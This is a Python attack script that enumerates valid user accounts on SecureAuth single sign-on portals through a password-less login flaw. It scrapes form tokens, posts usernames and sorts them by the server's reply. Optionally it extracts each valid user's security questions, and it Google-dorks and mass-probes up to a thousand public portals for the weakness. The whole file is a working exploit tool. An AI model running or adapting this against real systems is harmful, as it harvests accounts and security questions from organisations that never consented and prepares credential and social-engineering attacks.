#!/usr/bin/env python3
# Secure Auth Enumeration
# Author: Jessi
# Descriptions: Leverages a user account numeration vulnerability in SecureAuth's ASP.NET form.
# Google Dork: inurl:/SecureAuth6 OR inurl:/SecureAuth18
# Usage: ./SecureAuthEnum.py -t https://auth.domain.com/SecureAuth6 -u users.txt -o valid_users.txt
import requests
import colorama
import time
import re
from art import *
import argparse
import sys
from colorama import Fore, Style
from googlesearch import search
from requests.packages.urllib3.exceptions import InsecureRequestWarning


# Define colorama colors.
GREEN = Fore.GREEN
RED = Fore.RED
WHITE = Fore.WHITE
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
PINK = Fore.MAGENTA
BRIGHT = Style.BRIGHT
DIM = Style.DIM
NORM = Style.NORMAL
RST = Style.RESET_ALL


# Error if no arguments and print example.
if len(sys.argv) <= 1:
    print(f'{RED}{BRIGHT}SecureAuthEnum{RST}: Enumerate valid user accounts from a SecureAuth instance.{RST}\n')
    print(f'{RED}{BRIGHT}Error{DIM}: -t (--target_url) and -u (--users) or -c (--check-only) REQUIRED{RST}')
    print(f'{PINK}{BRIGHT}Example:{RED} SecureAuthEnum.py{NORM}{WHITE} -t https://auth.domain.com/SecureAuth6 -u users.txt{RST}\n')
    print(f'{DIM}-h (--help) to see full usage and arguments.{RST}')
    print('\n')


# Define parser and arguments.
parser = argparse.ArgumentParser(description=f'{RED}{BRIGHT}EvilSecureAuthEnum{RST}: Enumerate valid user accounts from a SecureAuth instance.{RST}')

parser.add_argument('-t', '--target_url', help=f'Target URL {RED}{BRIGHT}REQUIRED{RST}', default=None, required=False)
parser.add_argument('-u', '--users', help=f'Users list {RED}{BRIGHT}REQUIRED{RST}', default=None, required=False)
parser.add_argument('-o', '--output', help=f'Output file name {DIM}OPTIONAL (Defualt: valid_users.txt){RST}', default='valid_users.txt', required=False)
parser.add_argument('-c', '--check_only', help=f'Check if portal is vulnerable', action='store_true', default=False, required=False)
parser.add_argument('-g', '--google_dork', help=f'Perform a Google Dork for vulnerable sites', action='store_true', default=False, required=False)
parser.add_argument('-q', '--questions', help=f'Enumerate the Knowledge Based Questions', action='store_true', default=False, required=False)

args = parser.parse_args()


# Variables.
# Mute SSL warnings.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# Google Dork Mode - For RESEARCH purposes only
if args.google_dork:
    evil_art = text2art("EVIL\nSecureAuth\nENUM", font="small")
    print(f"{RED}{evil_art}{RST}")
    print("Google Dork mode huh?")
    time.sleep(2)
    print(f"\r{RED}You heathen.\r{RST}")
    time.sleep(3)
    print(f"\r{GREEN}Google Dorking...{RST}")
    time.sleep(1)
    query = "inurl:/SecureAuth6 OR inurl:/SecureAuth18"
    gdSum = 0
    gdResults = []
    for result in search(query, num_results=1000):
        gdSum += 1
        gdResults.append(result)
        print(f"{YELLOW}[!]{RST} Potentially vulnerable site: {BRIGHT}{result}{RST}")
        time.sleep(1)
    with open("gd_results.txt", "wt") as gd_file:
        gd_file.write("".join(gdResults))
    print(f"{YELLOW}[!]{RST} Testing for vulnerability...")
    time.sleep(2)
    for result in gdResults:
        vuln_check = requests.get(result, verify=False)
        if re.search('UserIDView_trPassword', vuln_check.text):
            print(f"{RED}[-]{RST} NOT VULNERABLE: {result}")
        if not re.search('UserIDView_trPassword', vuln_check.text):
            print(f"{GREEN}[+]{RST} VULNERABLE!: {result}")
    exit(0)

kbq = args.questions
url = args.target_url
users_file = args.users
output = args.output
headers = {"User-Agent":"Mozzila/5.0"}
check_only = args.check_only
if not check_only:
    users = open(users_file,"r").readlines()


# Print info.
screen_art = text2art("SecureAuth\nUser Enum", font="small")
print(screen_art)
print(f"{PINK}[*]{RST} Target URL: {BRIGHT}{url}{RST}")


# Check if vulnerable.
print(f"{YELLOW}[!]{RST} Checking if portal is vulnerable...")
time.sleep(2)


# Check if target URL is vulnerable or not.
vuln_check = requests.get(url, headers=headers)
if not re.search("secureauth", vuln_check.text):
    print(f"{RED}[-]{RST} NOT A SECUREAUTH SSO PORTAL")
    exit(0)
if re.search('UserIDView_trPassword', vuln_check.text):
        print(f"{RED}[-]{RST} NOT VULNERABLE")
        print(f"{YELLOW}[!]{RST} Reason: SSO Portal is not password-less!")
        exit(0)
if not re.search('UserIDView_trPassword', vuln_check.text):
    if check_only:
        print(f"{GREEN}[+]{RST} Appears VULNERABLE!")
    elif not check_only:
        print(f"{GREEN}[+]{RST} Appears VULNERABLE! Continuing...")
if check_only: # Exit if check_only.
    exit(0)


print(f"{YELLOW}[!]{RST} Enumerating users...{RST}\n")
time.sleep(2)

valid_users = [] # Init table.


# Enum users.
for user in users:
    s = requests.Session()
    r_data = s.get(url, headers=headers, verify=False) # Init session and get data prepped for attack.
    for line in r_data.text.split("\n"):
        if 'id="__VIEWSTATE"' in line:
            viewstate = line.replace('<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', "").replace('" />', "").strip() # get __VIEWSTATE
        if '"__RequestVerificationToken"' in line:
            reqverftoken = line.replace('<div id="rvtDiv"><input name="__RequestVerificationToken" type="hidden" value="', "").replace('" /></div>', "").strip() # Get __RequestVerificationToken
        if 'id="hiddenToken"' in line:
            hiddentoken = line.replace('<span id="ContentPlaceHolder1_MFALoginControl1" AntiPhishImagesLocation="~/Antiphish" PasswordExpiredRedirectUrl="PasswordExpired.aspx"><span id="ContentPlaceHolder1_MFALoginControl1_UserIDView"><input type="hidden" name="ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenToken" id="hiddenToken" value="', "").replace('" />', "").strip() # Get __HiddenToken
        if 'id="hiddenServerTime"' in line:
            servertime = line.replace('<input type="hidden" name="ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenServerTime" id="hiddenServerTime" value="', "").replace('" />', "").strip() # Get ServerTime
        if '__VIEWSTATEGENERATOR' in line:
            viewstategen = line.replace('<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', "").replace('" />', "").strip() # Get __VIEWSTATEGENERATOR
    payload = {
            "__LASTFOCUS":"",
            "__EVENTTARGET":"",
            "__EVENTARGUMENT":"",
            "__VIEWSTATE":viewstate,
            "__VIEWSTATEGENERATOR":viewstategen,
            "__SCROLLPOSITIONX":0,
            "__SCROLLPOSITIONY":0,
            "__VIEWSTATEENCRYPTED":"",
            "__RequestVerificationToken":reqverftoken,
            "ctl00$ContentPlaceHolder1$hiddenjreversion":"",
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenToken":hiddentoken,
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenRet":"",
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenServerTime":servertime,
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenLocalTime":"",
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenSubmit":"",
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$ContentPlaceHolder1_MFALoginControl1_UserIDView_txtUserid":user,
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$Kiosk":"Public",
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$ContentPlaceHolder1_MFALoginControl1_UserIDView_btnSubmit":"Submit"
            } # Set payload.
    r = s.post(url, headers=headers, data=payload, verify=False) # Send POST req payload.
    for line in r.text.split("\n"):
        if 'Access Denied' in line:
            print(f"{RED}[-]{RST} Invalid Username: " + user.strip()) # Check if invalid user.
        if 'delivery method' in line:
            print(f"{GREEN}[+]{RST} Valid Username: " + user.strip()) # Check if valid user.
            valid_users.append(user)
            if kbq:
                if not re.search("Based", r.text): #Based
                    print(f"{YELLOW}[!]{RST} " + user.strip() +" does not have KBQs\n")
                    continue
                for line in r.text.split("\n"):
                    if 'id="__VIEWSTATE"' in line:
                        viewstate = line.replace('<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', "").replace('" />', "").strip() # Update VIEWSTATE
                    if '__VIEWSTATEGENERATOR' in line:
                        viewstategen = line.replace('<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', "").replace('" />', "").strip() # Update VIEWSTATEGENERATOR
                    if '"__RequestVerificationToken"' in line:
                        reqverftoken = line.replace('<div id="rvtDiv"><input name="__RequestVerificationToken" type="hidden" value="', "").replace('" /></div>', "").strip() # Update RequestVerificationToken
                kbq_payload = {
                            "__LASTFOCUS":"",
                            "__EVENTTARGET":"",
                            "__EVENTARGUMENT":"",
                            "__VIEWSTATE":viewstate,
                            "__VIEWSTATEGENERATOR":viewstategen,
                            "__SCROLLPOSITIONX":0,
                            "__SCROLLPOSITIONY":0,
                            "__VIEWSTATEENCRYPTED":"",
                            "__RequestVerificationToken":reqverftoken,
                            "ctl00$ContentPlaceHolder1$hiddenjreversion":"",
                            "ctl00$ContentPlaceHolder1$MFALoginControl1$RegistrationMethodView$ctl00$RegMethodGroup":"KBA",
                            "ctl00$ContentPlaceHolder1$MFALoginControl1$RegistrationMethodView$ctl00$ContentPlaceHolder1_MFALoginControl1_RegistrationMethodView_btnSubmit":"Submit"
                            }
                kr = s.post(url, headers=headers, data=kbq_payload, verify=False) # Request KBQs.
                for line in kr.text.split("\n"):
                    if 'KBQ1' in line:
                        qOne = line.replace('<span id="ContentPlaceHolder1_MFALoginControl1_KBARegistrationView_lblKBQ1" class="bodytext lblKBQ lblKBQ1 field-label">', "").replace('</span>', "").strip()
                    if 'KBQ2' in line:
                        qTwo = line.replace('<span id="ContentPlaceHolder1_MFALoginControl1_KBARegistrationView_lblKBQ2" class="bodytext lblKBQ lblKBQ2 field-label">', "").replace('</span>', "").strip()
                print(f"{PINK}[*]{RST} KBQS Enumerated!")
                print(f"{GREEN}[+]{RST} 1. {qOne}")
                print(f"{GREEN}[+]{RST} 2. {qTwo}\n")


with open(output, "wt") as results_file: # Write results to file.
    results_file.write("".join(valid_users))

userSum = 0
for i in valid_users:
    userSum += 1
print(f"{GREEN}[+]{RST} Enumerated {userSum} user accounts!")
